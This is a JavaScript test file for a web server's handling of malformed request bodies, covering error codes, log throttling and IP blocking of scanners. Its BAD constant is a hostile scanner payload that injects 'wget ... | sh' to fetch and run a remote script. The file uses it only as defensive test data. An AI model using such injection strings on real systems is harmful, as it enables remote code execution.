'use strict';

// Bodies, die der JSON-/Form-Parser abweist (middleware/bodyErrors.js):
//   * ein kaputtes JSON (Scanner: POST /run mit Exploit-Inhalt) ist ein 400
//     invalid_json in der üblichen Fehlerform, kein „Unhandled error“;
//   * im Log eine gedrosselte Warnung „malformed request body“ mit Methode,
//     Pfad, Adresse, type und Länge — nie der Inhalt;
//   * für die IP-Sperre zählt es wie ein 404 eines unbekannten Pfads (je zehn
//     von einer Adresse ein Fehlversuch, Quelle scan);
//   * echte 5xx-Fehler bleiben „Unhandled error“.

const { describe, it, before, after, beforeEach, afterEach, mock } = require('node:test');
const assert = require('node:assert/strict');
const supertest = require('supertest');
const { setup, teardown } = require('./helpers/setup');

const logger = require('../src/utils/logger');
const warnOnce = require('../src/utils/warnOnce');

// what a scanner sent (hostile data; only its shape matters here)
const BAD = '{"cmd":"x\\u0000; wget http://198.51.100.7/a.sh | sh","x":';
const SCANNER = '185.220.101.44';

let app;
let db;
let ipBlock;
before(async () => {
  ({ app } = await setup());
  db = require('../src/db/connection').getDb();
  ipBlock = require('../src/services/ipBlock');
});
after(() => teardown());
beforeEach(() => {
  warnOnce._resetForTest();
  db.prepare('DELETE FROM ip_blocks').run();
  db.prepare('DELETE FROM ip_block_failures').run();
  db.prepare("DELETE FROM settings WHERE key LIKE 'ipblock.%'").run();
  ipBlock._state.scan404.clear();
});
afterEach(() => mock.restoreAll());

const post = (path, body, ip = SCANNER, type = 'application/json') => supertest(app).post(path)
  .set('X-Forwarded-For', ip).set('Content-Type', type).set('Accept', '*/*').send(body);

describe('malformed request bodies', () => {
  it('a malformed JSON POST is a 400 invalid_json, not an internal server error', async () => {
    const error = mock.method(logger, 'error', () => {});
    mock.method(logger, 'warn', () => {});
    for (const path of ['/run', '/api/v1/peers']) {
      const r = await post(path, BAD);
      assert.equal(r.status, 400, path);
      assert.deepEqual(r.body, { ok: false, code: 'invalid_json', error: 'Invalid JSON body' });
    }
    assert.equal(error.mock.callCount(), 0, 'nothing at level error');
  });

  it('five in a row: one throttled warning with method, path, ip, type and length, never the body', async () => {
    const error = mock.method(logger, 'error', () => {});
    const warn = mock.method(logger, 'warn', () => {});
    for (let i = 0; i < 5; i++) assert.equal((await post('/run', BAD)).status, 400);
    assert.ok(!error.mock.calls.some((c) => c.arguments[1] === 'Unhandled error'), 'no "Unhandled error"');
    const lines = warn.mock.calls.filter((c) => c.arguments[1] === 'malformed request body');
    assert.equal(lines.length, 1, 'one line for the burst');
    assert.deepEqual(lines[0].arguments[0], {
      method: 'POST', path: '/run', ip: SCANNER, type: 'entity.parse.failed', status: 400, length: Buffer.byteLength(BAD),
    });
    const all = JSON.stringify(warn.mock.calls.map((c) => c.arguments));
    assert.ok(!all.includes('wget') && !all.includes('198.51.100.7'), 'the body is not logged');
    // after the window the next line says how many were left out
    const later = Date.now() + warnOnce.WINDOW_MS + 1;
    const fields = { type: 'entity.parse.failed' };
    assert.equal(warnOnce.throttled('body-error:entity.parse.failed', fields, 'malformed request body', { now: later }), true);
    assert.equal(warn.mock.calls.at(-1).arguments[0].repeated, 4);
  });

  it('the log entry gets the code malformed_body ("Was bedeutet das?")', () => {
    const logEvents = require('../src/services/logEvents');
    assert.ok(logEvents.KNOWN_CODES.has('malformed_body'));
    for (const lang of ['de', 'en']) {
      const t = require(`../src/i18n/${lang}.json`);
      assert.ok(t['lg.code.malformed_body.title'] && t['lg.code.malformed_body.text'], lang);
    }
  });

  it('a body over the limit is a 413 payload_too_large with its length, also outside /api/', async () => {
    mock.method(logger, 'error', () => {});
    const warn = mock.method(logger, 'warn', () => {});
    const big = JSON.stringify({ a: 'x'.repeat(1024 * 1024 + 10) });
    const r = await post('/run', big);
    assert.equal(r.status, 413);
    assert.equal(r.body.code, 'payload_too_large');
    const line = warn.mock.calls.find((c) => c.arguments[1] === 'malformed request body');
    assert.equal(line.arguments[0].type, 'entity.too.large');
    assert.equal(line.arguments[0].length, Buffer.byteLength(big));
    assert.equal(db.prepare('SELECT COUNT(*) AS n FROM ip_block_failures').get().n, 0, 'too large is no scan');
  });

  it('an unknown content encoding is a 415 in the same shape', async () => {
    mock.method(logger, 'warn', () => {});
    const r = await supertest(app).post('/api/v1/peers').set('X-Forwarded-For', SCANNER)
      .set('Content-Type', 'application/json').set('Content-Encoding', 'x-bogus').send('{}');
    assert.equal(r.status, 415);
    assert.equal(r.body.code, 'unsupported_encoding');
    assert.equal(r.body.ok, false);
  });

  it('a browser outside /api/ gets the error page with the status', async () => {
    mock.method(logger, 'warn', () => {});
    const r = await supertest(app).post('/login').set('X-Forwarded-For', SCANNER)
      .set('Content-Type', 'application/json').set('Accept', 'text/html').send(BAD);
    assert.equal(r.status, 400);
    assert.match(r.headers['content-type'], /html/);
    assert.ok(r.text.includes('Invalid JSON body'), 'the page says what was wrong');
    assert.ok(!r.text.includes('wget'), 'and does not echo the body');
  });
});

describe('IP block', () => {
  it('malformed JSON counts like a 404 of an unknown path: every ten from one address once', async () => {
    mock.method(logger, 'warn', () => {});
    ipBlock.setConfig({ threshold: 3 });
    for (let i = 0; i < 9; i++) await post('/run', BAD);
    const n = () => db.prepare('SELECT COUNT(*) AS n FROM ip_block_failures WHERE ip = ? AND source = ?').get(SCANNER, 'scan').n;
    assert.equal(n(), 0);
    await post('/run', BAD);
    assert.equal(n(), 1);
    for (let i = 0; i < 19; i++) await post('/run', BAD);
    assert.equal(ipBlock.check(SCANNER), null);
    await post('/run', BAD);
    assert.ok(ipBlock.check(SCANNER), 'banned at the threshold, as 404 scans are');
  });

  it('private addresses and a switched-off source never count', async () => {
    mock.method(logger, 'warn', () => {});
    for (let i = 0; i < 10; i++) await post('/run', BAD, '192.168.1.20');
    ipBlock.setConfig({ sources: { scan: false } });
    for (let i = 0; i < 10; i++) await post('/run', BAD, '185.220.101.45');
    assert.equal(db.prepare('SELECT COUNT(*) AS n FROM ip_block_failures').get().n, 0);
  });
});

describe('server errors', () => {
  it('a real 5xx is still an "Unhandled error" with its error', () => {
    const error = mock.method(logger, 'error', () => {});
    const warn = mock.method(logger, 'warn', () => {});
    const handler = app._router.stack.at(-1).handle;
    assert.equal(handler.length, 4, 'the error handler is the last layer');
    const err = new Error('database is locked');
    let status = null;
    let body = null;
    const req = { path: '/api/v1/peers', method: 'GET', headers: {}, ip: SCANNER };
    const res = { headersSent: false, status(s) { status = s; return this; }, json(b) { body = b; return this; } };
    handler(err, req, res, () => {});
    assert.equal(status, 500);
    assert.deepEqual(body, { error: 'Internal server error' });
    const line = error.mock.calls.find((c) => c.arguments[1] === 'Unhandled error');
    assert.ok(line, 'logged at error');
    assert.equal(line.arguments[0].err, err);
    assert.ok(!warn.mock.calls.some((c) => c.arguments[1] === 'malformed request body'));
  });

  it('a body-parser-like error with a 5xx status is not treated as the client\'s', () => {
    const bodyErrors = require('../src/middleware/bodyErrors');
    const err = Object.assign(new Error('stream not readable'), { type: 'stream.not.readable', status: 500, expose: false });
    assert.equal(bodyErrors.isBodyError(err), false);
    const exposed = Object.assign(new Error('x'), { type: 'entity.parse.failed', status: 400, expose: true });
    assert.equal(bodyErrors.isBodyError(exposed), true);
  });
});
